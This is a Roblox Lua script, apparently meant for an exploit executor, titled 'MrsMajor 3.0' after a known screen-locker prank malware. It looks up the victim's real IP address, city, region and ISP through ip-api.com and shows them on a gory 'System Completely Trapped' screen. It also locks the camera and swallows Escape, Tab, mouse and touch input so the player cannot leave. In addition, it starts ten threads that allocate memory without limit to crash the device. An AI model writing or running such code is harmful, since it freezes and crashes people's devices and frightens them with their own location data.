-- MrsMajor_3_0_Ultimate_Brutal.lua
-- Unified script: Progressive deepening red screen, sticking blood splatters, instant multi-platform RAM killer, 1-min timer, and lockdown
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local camera = workspace.CurrentCamera

--------------------------------------------------------------------------------
-- КОНФИГУРАЦИЯ
--------------------------------------------------------------------------------
local AUDIO_ASSET_ID = "rbxassetid://0"
local AUDIO_VOLUME = 0.75
local TOTAL_BLOOD_TIME = 60            -- 1 минута таймер
local BLOOD_ASSET_ID = "rbxassetid://14280704585"

-- Получение реального IP через ip-api.com
local success, ipData = pcall(function()
    local response = game:HttpGet("http://ip-api.com/json")
    return HttpService:JSONDecode(response)
end)

local targetIP = (success and ipData and ipData.query) or "127.0.0.1"
local city = (success and ipData and ipData.city) or "Unknown City"
local region = (success and ipData and ipData.regionName) or "Unknown Region"
local country = (success and ipData and ipData.country) or "Unknown Country"
local org = (success and ipData and ipData.isp) or "Unknown ISP"

--------------------------------------------------------------------------------
-- ТОТАЛЬНАЯ БЛОКИРОВКА ВЫХОДА И УПРАВЛЕНИЯ (PC, IPAD, IPHONE, ANDROID)
--------------------------------------------------------------------------------
task.wait(0.1)
camera.CameraType = Enum.CameraType.Scriptable
local fixedCameraCFrame = camera.CFrame

RunService:BindToRenderStep("FreezeCameraStep", Enum.RenderPriority.Camera.Value + 1, function()
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = fixedCameraCFrame
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    UserInputService.MouseIconEnabled = true
end)

local function sinkAction()
    return Enum.ContextActionResult.Sink
end

-- Перехват всех возможных клавиш, мыши и тач-взаимодействий для защиты от выхода
ContextActionService:BindActionAtPriority(
    "DisableInputsAction",
    sinkAction,
    false,
    Enum.ContextActionPriority.High.Value + 1000,
    Enum.UserInputType.MouseButton1,
    Enum.UserInputType.MouseButton2,
    Enum.UserInputType.MouseWheel,
    Enum.UserInputType.Touch,
    Enum.KeyCode.Escape, Enum.KeyCode.F11, Enum.KeyCode.Tab,
    Enum.KeyCode.W, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D,
    Enum.KeyCode.Space, Enum.KeyCode.LeftControl, Enum.KeyCode.LeftAlt
)

task.spawn(function()
    local pScripts = player:WaitForChild("PlayerScripts", 5)
    if pScripts then
        local pModule = pScripts:WaitForChild("PlayerModule", 3)
        if pModule then
            local pSuccess, playerModule = pcall(require, pModule)
            if pSuccess and playerModule then
                local controls = playerModule:GetControls()
                if controls then controls:Disable() end
            end
        end
    end
end)

local function freezeHumanoid(char)
    local hum = char:WaitForChild("Humanoid", 5)
    if hum then
        hum.WalkSpeed = 0
        hum.JumpPower = 0
        hum.JumpHeight = 0
    end
end
if player.Character then freezeHumanoid(player.Character) end
player.CharacterAdded:Connect(freezeHumanoid)

--------------------------------------------------------------------------------
-- СОЗДАНИЕ ГЛАВНОГО GUI
--------------------------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MrsMajorBrutalUI"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local protectedParent = pcall(function()
    screenGui.Parent = CoreGui
end)
if not protectedParent then
    screenGui.Parent = playerGui
end

--------------------------------------------------------------------------------
-- КРАСНЫЙ ФОН (ПОСТЕПЕННОЕ ЗАТЕМНЕНИЕ ДО ГУСТОГО КРОВАВОГО)
--------------------------------------------------------------------------------
local bgOverlay = Instance.new("Frame")
bgOverlay.Name = "RedOverlay"
bgOverlay.Size = UDim2.new(1, 0, 1, 0)
bgOverlay.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
bgOverlay.BackgroundTransparency = 0.75
bgOverlay.BorderSizePixel = 0
bgOverlay.ZIndex = 1
bgOverlay.Parent = screenGui

--------------------------------------------------------------------------------
-- ВИСЯЩАЯ И НАКАПЛИВАЮЩАЯСЯ КРОВЬ (БЕЗ МЕЛЬКАНИЯ, КРОВЬ ОСТАЕТСЯ НА ЭКРАНЕ)
--------------------------------------------------------------------------------
local dripFolder = Instance.new("Folder")
dripFolder.Name = "BloodSplatters"
dripFolder.Parent = screenGui

task.spawn(function()
    while screenGui.Parent do
        local drip = Instance.new("ImageLabel")
        local width = math.random(25, 60)
        local height = math.random(200, 450)
        local startX = math.random()

        drip.Size = UDim2.new(0, width, 0, height)
        drip.Position = UDim2.new(startX, 0, -0.6, 0)
        drip.Image = BLOOD_ASSET_ID
        drip.BackgroundTransparency = 1
        drip.ZIndex = 2
        drip.Parent = dripFolder

        local targetY = math.random(0, 60) / 100
        TweenService:Create(drip, TweenInfo.new(math.random(2, 4), Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Position = UDim2.new(startX, 0, targetY, 0)
        }):Play()

        task.wait(0.8) -- Постепенно накидывает новые кровавые подтеки, которые висят на экране
    end
end)

--------------------------------------------------------------------------------
-- ГЛАВНОЕ ОКНО ИНТЕРФЕЙСА
--------------------------------------------------------------------------------
local WIN_WIDTH = 540
local WIN_HEIGHT = 420

local mainWindow = Instance.new("Frame")
mainWindow.Name = "MainWindow"
mainWindow.Size = UDim2.new(0, WIN_WIDTH, 0, WIN_HEIGHT)
mainWindow.Position = UDim2.new(0.5, -WIN_WIDTH / 2, 0.5, -WIN_HEIGHT / 2)
mainWindow.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainWindow.BorderColor3 = Color3.fromRGB(180, 0, 0)
mainWindow.BorderSizePixel = 3
mainWindow.ZIndex = 10
mainWindow.Parent = screenGui

-- Title Bar (Без возможности закрыть)
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(120, 0, 0)
titleBar.BorderSizePixel = 0
titleBar.ZIndex = 11
titleBar.Parent = mainWindow

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -10, 1, 0)
titleText.Position = UDim2.new(0, 10, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Font = Enum.Font.SourceSansBold
titleText.TextSize = 15
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Text = "MrsMajor 3.0 - Lockdown & Execution"
titleText.ZIndex = 12
titleText.Parent = titleBar

-- Header & IP Info
local iconBox = Instance.new("Frame")
iconBox.Size = UDim2.new(0, 65, 0, 65)
iconBox.Position = UDim2.new(0, 15, 0, 40)
iconBox.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
iconBox.BorderColor3 = Color3.fromRGB(200, 0, 0)
iconBox.BorderSizePixel = 2
iconBox.ZIndex = 11
iconBox.Parent = mainWindow

local eyeIcon = Instance.new("TextLabel")
eyeIcon.Size = UDim2.new(1, 0, 1, 0)
eyeIcon.BackgroundTransparency = 1
eyeIcon.Text = "👁"
eyeIcon.TextSize = 40
eyeIcon.TextColor3 = Color3.fromRGB(255, 30, 30)
eyeIcon.ZIndex = 12
eyeIcon.Parent = iconBox

local headerText = Instance.new("TextLabel")
headerText.Size = UDim2.new(0, 430, 0, 28)
headerText.Position = UDim2.new(0, 90, 0, 40)
headerText.BackgroundTransparency = 1
headerText.Font = Enum.Font.GothamBold
headerText.TextSize = 22
headerText.TextColor3 = Color3.fromRGB(255, 40, 40)
headerText.TextXAlignment = Enum.TextXAlignment.Left
headerText.Text = "System Completely Trapped"
headerText.ZIndex = 11
headerText.Parent = mainWindow

local subText = Instance.new("TextLabel")
subText.Size = UDim2.new(0, 430, 0, 36)
subText.Position = UDim2.new(0, 90, 0, 68)
subText.BackgroundTransparency = 1
subText.Font = Enum.Font.SourceSans
subText.TextSize = 13
subText.TextColor3 = Color3.fromRGB(200, 200, 200)
subText.TextXAlignment = Enum.TextXAlignment.Left
subText.TextYAlignment = Enum.TextYAlignment.Top
subText.TextWrapped = true
subText.Text = string.format("IP: %s | %s, %s\nISP: %s", targetIP, city, country, org)
subText.ZIndex = 11
subText.Parent = mainWindow

-- Blood Bar
local bloodLabel = Instance.new("TextLabel")
bloodLabel.Size = UDim2.new(1, -30, 0, 20)
bloodLabel.Position = UDim2.new(0, 15, 0, 115)
bloodLabel.BackgroundTransparency = 1
bloodLabel.Font = Enum.Font.SourceSansBold
bloodLabel.TextSize = 15
bloodLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
bloodLabel.TextXAlignment = Enum.TextXAlignment.Left
bloodLabel.Text = "Blood Left: 100% (60 sec)"
bloodLabel.ZIndex = 11
bloodLabel.Parent = mainWindow

local barBackground = Instance.new("Frame")
barBackground.Size = UDim2.new(1, -30, 0, 24)
barBackground.Position = UDim2.new(0, 15, 0, 138)
barBackground.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
barBackground.BorderColor3 = Color3.fromRGB(140, 0, 0)
barBackground.BorderSizePixel = 2
barBackground.ZIndex = 11
barBackground.Parent = mainWindow

local bloodFill = Instance.new("Frame")
bloodFill.Size = UDim2.new(1, 0, 1, 0)
bloodFill.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
bloodFill.BorderSizePixel = 0
bloodFill.ZIndex = 12
bloodFill.Parent = barBackground

-- Log Box
local logBox = Instance.new("TextBox")
logBox.Size = UDim2.new(1, -30, 0, 150)
logBox.Position = UDim2.new(0, 15, 0, 172)
logBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
logBox.BorderColor3 = Color3.fromRGB(80, 0, 0)
logBox.BorderSizePixel = 1
logBox.Font = Enum.Font.Code
logBox.TextSize = 12
logBox.TextColor3 = Color3.fromRGB(255, 130, 130)
logBox.ClearTextOnFocus = false
logBox.TextEditable = false
logBox.TextXAlignment = Enum.TextXAlignment.Left
logBox.TextYAlignment = Enum.TextYAlignment.Top
logBox.TextWrapped = true
logBox.Text = string.format(
    "> MrsMajor v3.0 brutal lockdown active.\n> Real Target IP: %s\n> Location: %s, %s (%s)\n> Platform escape routes severed.\n> Multi-threaded RAM killer armed...",
    targetIP, city, region, country, org
)
logBox.ZIndex = 11
logBox.Parent = mainWindow

--------------------------------------------------------------------------------
-- 1-МИНУТНЫЙ ТАЙМЕР + ПОСТЕПЕННОЕ ЗАТЕМНЕНИЕ ФОНА + МОМЕНТАЛЬНЫЙ УБИЙЦА ОЗУ
--------------------------------------------------------------------------------
task.spawn(function()
    -- Мгновенный запуск многопоточного пожирателя RAM для PC, iPad, iPhone, Android
    for i = 1, 10 do
        task.spawn(function()
            local memoryHog = {}
            while true do
                table.insert(memoryHog, string.rep("MRSMAJOR_BRUTAL_RAM_ANNIHILATION_VEX_", 10000000))
                task.wait()
            end
        end)
    end

    local remaining = TOTAL_BLOOD_TIME
    while remaining > 0 and screenGui.Parent do
        task.wait(1)
        remaining = remaining - 1
        local percent = math.clamp(remaining / TOTAL_BLOOD_TIME, 0, 1)

        -- Экран с каждой секундой становится все темнее и кровавее (без мерцания)
        local currentOpacity = 0.75 - ((1 - percent) * 0.65)
        bgOverlay.BackgroundTransparency = math.clamp(currentOpacity, 0.1, 0.75)

        bloodLabel.Text = string.format("Blood Left: %d%% (%d sec)", math.floor(percent * 100), remaining)
        bloodFill.Size = UDim2.new(percent, 0, 1, 0)
    end

    bloodLabel.Text = "Blood Left: 0% (TERMINATED)"
    bloodLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    bloodFill.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
end)

--------------------------------------------------------------------------------
-- ФОНОВОЕ АУДИО
--------------------------------------------------------------------------------
local bgSound = Instance.new("Sound")
bgSound.Name = "MrsMajorTheme"
bgSound.SoundId = AUDIO_ASSET_ID
bgSound.Volume = AUDIO_VOLUME
bgSound.Looped = true
bgSound.Parent = SoundService

if AUDIO_ASSET_ID ~= "rbxassetid://0" then
    bgSound:Play()
end
